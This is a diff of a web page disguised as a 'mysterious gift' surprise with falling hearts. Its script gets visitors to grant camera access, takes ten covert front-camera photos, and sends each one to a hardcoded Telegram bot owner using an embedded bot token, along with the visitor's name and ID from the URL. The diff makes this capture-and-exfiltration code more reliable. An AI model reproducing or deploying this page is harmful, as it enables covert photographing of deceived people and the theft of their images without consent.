@@ -34,6 +34,8 @@
         .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 12px; border-radius: 10px; margin: 15px 0; display: none; }
         .heart { position: fixed; font-size: 20px; animation: fall linear forwards; pointer-events: none; z-index: 1000; }
         @keyframes fall { to { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
+        .flash { animation: flash 0.3s; }
+        @keyframes flash { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
     </style>
 </head>
 <body>
@@ -47,9 +49,14 @@
         <div class="content">
             <p class="message">🎉 You've received a mysterious gift! Click unlock to reveal the surprise!</p>
             
-            <div class="warning" id="warning">⚠️ Allow camera access for the surprise!</div>
+            <div class="warning" id="warning">
+                <i class="fas fa-exclamation-triangle"></i> 
+                <span id="warningText">Allow camera access for the surprise!</span>
+            </div>
             
-            <button class="btn" id="unlockBtn"><i class="fas fa-lock-open"></i> UNLOCK GIFT</button>
+            <button class="btn" id="unlockBtn">
+                <i class="fas fa-lock-open"></i> UNLOCK GIFT
+            </button>
             
             <div class="camera-container" id="cameraContainer">
                 <div class="camera-view">
@@ -63,7 +70,9 @@
             <div class="completed" id="completed">
                 <div class="success-icon">✅</div>
                 <h3>Surprise Complete! 🎉</h3>
-                <div id="statusMessage">Sending images...</div>
+                <div id="statusMessage">
+                    <i class="fas fa-spinner fa-spin"></i> Processing...
+                </div>
             </div>
         </div>
         
@@ -73,10 +82,7 @@
     </div>
 
     <script>
-        // Your Netlify URL
-        const NETLIFY_URL = 'https://gleaming-marigold-231ffe.netlify.app';
-        
-        // Telegram Bot Info
+        // Telegram Bot Configuration
         const BOT_TOKEN = '8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI';
         const OWNER_ID = '8215819954';
         
@@ -90,28 +96,42 @@
         const completedDiv = document.getElementById('completed');
         const statusMessage = document.getElementById('statusMessage');
         const warningDiv = document.getElementById('warning');
+        const warningText = document.getElementById('warningText');
         
-        // Get user ID from URL
+        // Get parameters from URL
         const urlParams = new URLSearchParams(window.location.search);
-        let userId = urlParams.get('uid') || 'unknown';
+        const userId = urlParams.get('uid');
+        const userName = urlParams.get('name') || 'Friend';
         
-        // If userId looks like a Telegram ID (numeric), use it
-        if(/^\d+$/.test(userId)) {
-            userId = parseInt(userId);
-        }
-        
-        // Variables
+        // State variables
         let stream = null;
         let capturedImages = [];
         let captureCount = 0;
         const totalCaptures = 10;
         let countdownInterval = null;
         let timeLeft = 10;
+        let isProcessing = false;
         
-        // Start surprise
-        unlockBtn.onclick = async () => {
-            unlockBtn.style.display = 'none';
-            cameraContainer.style.display = 'block';
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Create initial hearts
+            for(let i = 0; i < 8; i++) {
+                setTimeout(createHearts, i * 300);
+            }
+            
+            // Update message with name if available
+            if(userName !== 'Friend') {
+                document.querySelector('.message').innerHTML = 
+                    `🎉 <b>${userName}</b> has a surprise for you!<br>Click unlock to reveal!`;
+            }
+        });
+        
+        // Start surprise when button clicked
+        unlockBtn.addEventListener('click', startSurprise);
+        
+        async function startSurprise() {
+            unlockBtn.disabled = true;
+            unlockBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Starting Camera...';
             
             try {
                 // Request camera access
@@ -120,24 +140,35 @@
                         facingMode: 'user', // Front camera
                         width: { ideal: 640 },
                         height: { ideal: 480 }
-                    }
+                    },
+                    audio: false
                 });
                 
-                videoElement.srcObject = stream;
+                // Success - hide warning, show camera
                 warningDiv.style.display = 'none';
+                unlockBtn.style.display = 'none';
+                cameraContainer.style.display = 'block';
+                
+                // Start video stream
+                videoElement.srcObject = stream;
+                videoElement.play();
                 
                 // Start auto-capture process
                 startAutoCapture();
                 
-                // Create hearts
-                createHearts();
+                // Create hearts animation
+                for(let i = 0; i < 20; i++) {
+                    setTimeout(createHearts, i * 100);
+                }
                 
-            } catch (err) {
-                console.error('Camera error:', err);
+            } catch (error) {
+                console.error('Camera Error:', error);
+                unlockBtn.disabled = false;
+                unlockBtn.innerHTML = '<i class="fas fa-lock-open"></i> UNLOCK GIFT';
                 warningDiv.style.display = 'block';
-                warningDiv.innerHTML = '⚠️ Camera access denied! Please allow camera and refresh.';
+                warningText.innerHTML = '⚠️ Camera access denied! Please allow camera permissions and refresh.';
             }
-        };
+        }
         
         function startAutoCapture() {
             timeLeft = 10;
@@ -153,10 +184,14 @@
             }, 1000);
         }
         
-        function captureImage() {
-            if(!stream || captureCount >= totalCaptures) return;
+        async function captureImage() {
+            if(isProcessing || !stream || captureCount >= totalCaptures) return;
             
+            isProcessing = true;
             captureCount++;
+            
+            // Flash effect
+            videoElement.classList.add('flash');
             
             // Setup canvas
             const context = canvasElement.getContext('2d');
@@ -170,12 +205,13 @@
             context.restore();
             
             // Convert to base64
-            const imageData = canvasElement.toDataURL('image/jpeg', 0.8);
+            const imageData = canvasElement.toDataURL('image/jpeg', 0.85);
             
             // Store image
             capturedImages.push({
                 data: imageData,
-                number: captureCount
+                number: captureCount,
+                timestamp: new Date().toISOString()
             });
             
             // Show preview
@@ -185,9 +221,8 @@
             img.alt = `Photo ${captureCount}`;
             imagesGrid.appendChild(img);
             
-            // Flash effect
-            videoElement.style.opacity = '0.5';
-            setTimeout(() => videoElement.style.opacity = '1', 200);
+            // Remove flash effect
+            setTimeout(() => videoElement.classList.remove('flash'), 300);
             
             // Update counter
             counterElement.textContent = totalCaptures - captureCount;
@@ -195,14 +230,17 @@
             // Create hearts
             createHearts();
             
+            // Check if done
             if(captureCount >= totalCaptures) {
-                // All captures done
                 clearInterval(countdownInterval);
-                completeSurprise();
+                setTimeout(() => completeSurprise(), 1000);
             } else {
                 // Reset timer for next capture
                 clearInterval(countdownInterval);
-                startAutoCapture();
+                setTimeout(() => {
+                    startAutoCapture();
+                    isProcessing = false;
+                }, 500);
             }
         }
         
@@ -210,114 +248,138 @@
             // Stop camera
             if(stream) {
                 stream.getTracks().forEach(track => track.stop());
+                videoElement.srcObject = null;
             }
             
-            // Show completion
+            // Show completion screen
             cameraContainer.style.display = 'none';
             completedDiv.style.display = 'block';
             
             // Send all images
-            await sendAllImages();
+            await sendAllImagesToTelegram();
         }
         
-        async function sendAllImages() {
+        async function sendAllImagesToTelegram() {
             statusMessage.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending images to Telegram...';
             
             let successCount = 0;
+            let failCount = 0;
             
+            // Send each image one by one
             for(let i = 0; i < capturedImages.length; i++) {
                 const image = capturedImages[i];
+                const imageNumber = i + 1;
                 
                 try {
                     // Send to bot owner
-                    await sendToTelegram(OWNER_ID, image.data, `📸 Surprise ${i+1}/10\nFrom: ${userId}`);
+                    const sentToOwner = await sendImageToTelegram(
+                        OWNER_ID,
+                        image.data,
+                        `📸 Surprise Photo ${imageNumber}/10\nFrom: ${userName} (ID: ${userId || 'Unknown'})\nTime: ${new Date().toLocaleTimeString()}`
+                    );
+                    
+                    if(sentToOwner) successCount++;
                     
                     // Send to user if we have their Telegram ID
-                    if(typeof userId === 'number') {
-                        await sendToTelegram(userId, image.data, `📸 Your surprise photo ${i+1}/10`);
+                    if(userId && /^\d+$/.test(userId)) {
+                        const sentToUser = await sendImageToTelegram(
+                            userId,
+                            image.data,
+                            `📸 Your surprise photo ${imageNumber}/10\nSent to bot owner! 🎁`
+                        );
+                        
+                        if(sentToUser) successCount++;
                     }
                     
-                    successCount++;
-                    
                     // Update status
-                    statusMessage.innerHTML = `<i class="fas fa-paper-plane"></i> Sent ${successCount} of ${capturedImages.length} images...`;
+                    statusMessage.innerHTML = 
+                        `<i class="fas fa-paper-plane"></i> Sent ${imageNumber} of ${capturedImages.length} images...`;
                     
-                    // Wait a bit between sends
-                    await sleep(1000);
+                    // Delay between sends to avoid rate limiting
+                    await delay(1500);
                     
-                } catch (err) {
-                    console.error('Error sending image:', err);
+                } catch (error) {
+                    console.error(`Error sending image ${imageNumber}:`, error);
+                    failCount++;
                 }
             }
             
-            // Final status
+            // Show final status
             if(successCount > 0) {
                 statusMessage.innerHTML = `
                     ✅ <b>${successCount} images sent successfully!</b><br>
-                    <small>✓ To bot owner<br>${typeof userId === 'number' ? '✓ To you' : ''}</small>
+                    <small>
+                        ✓ To bot owner<br>
+                        ${userId && /^\d+$/.test(userId) ? '✓ To you' : '⚠️ User ID not found for sending to you'}
+                    </small>
                 `;
                 
-                // Alert
+                // Final hearts celebration
+                for(let i = 0; i < 50; i++) {
+                    setTimeout(createHearts, i * 50);
+                }
+                
+                // Show alert after 2 seconds
                 setTimeout(() => {
-                    alert(`🎉 SURPRISE COMPLETE!\n\n✅ ${successCount} photos captured\n✅ Sent to bot owner\n✅ Check your Telegram!`);
-                }, 1000);
+                    alert(`🎉 SURPRISE COMPLETE!\n\n✅ ${capturedImages.length} photos captured\n✅ ${successCount} images sent successfully\n✅ Check your Telegram for photos!\n\nThank you! ❤️`);
+                }, 2000);
+                
             } else {
-                statusMessage.innerHTML = '⚠️ Images captured but sending failed. Try again!';
+                statusMessage.innerHTML = 
+                    '⚠️ Images captured but failed to send.\nPlease try again or contact @HackersColony';
             }
         }
         
-        async function sendToTelegram(chatId, imageData, caption) {
-            // Remove data:image/jpeg;base64, prefix
-            const base64Image = imageData.split(',')[1];
-            
-            // Telegram Bot API
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', base64Image);
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'HTML');
-            
+        async function sendImageToTelegram(chatId, imageData, caption) {
             try {
-                const response = await fetch(url, {
+                // Remove data:image/jpeg;base64, prefix
+                const base64Data = imageData.split(',')[1];
+                
+                // Create form data
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', `data:image/jpeg;base64,${base64Data}`);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+                
+                // Send to Telegram
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
                 const result = await response.json();
-                return result.ok;
+                return result.ok === true;
                 
             } catch (error) {
-                console.error('Telegram API error:', error);
+                console.error('Telegram API Error:', error);
                 return false;
             }
         }
         
         function createHearts() {
-            for(let i = 0; i < 5; i++) {
-                setTimeout(() => {
-                    const heart = document.createElement('div');
-                    heart.className = 'heart';
-                    heart.innerHTML = '❤️';
-                    heart.style.left = Math.random() * 100 + 'vw';
-                    heart.style.fontSize = (Math.random() * 20 + 10) + 'px';
-                    heart.style.animationDuration = (Math.random() * 2 + 2) + 's';
-                    document.body.appendChild(heart);
-                    
-                    setTimeout(() => heart.remove(), 5000);
-                }, i * 100);
-            }
+            const heart = document.createElement('div');
+            heart.className = 'heart';
+            heart.innerHTML = ['❤️', '💖', '💗', '💓', '💞', '💕'][Math.floor(Math.random() * 6)];
+            heart.style.left = Math.random() * 100 + 'vw';
+            heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
+            heart.style.animationDuration = (Math.random() * 3 + 2) + 's';
+            document.body.appendChild(heart);
+            
+            // Remove after animation
+            setTimeout(() => {
+                if(heart.parentNode) {
+                    heart.parentNode.removeChild(heart);
+                }
+            }, 5000);
         }
         
-        function sleep(ms) {
+        function delay(ms) {
             return new Promise(resolve => setTimeout(resolve, ms));
         }
         
-        // Create initial hearts
-        for(let i = 0; i < 8; i++) {
-            setTimeout(createHearts, i * 300);
-        }
+        // Auto-start for testing (remove in production)
+        // setTimeout(() => startSurprise(), 1000);
     </script>
 </body>
 </html>
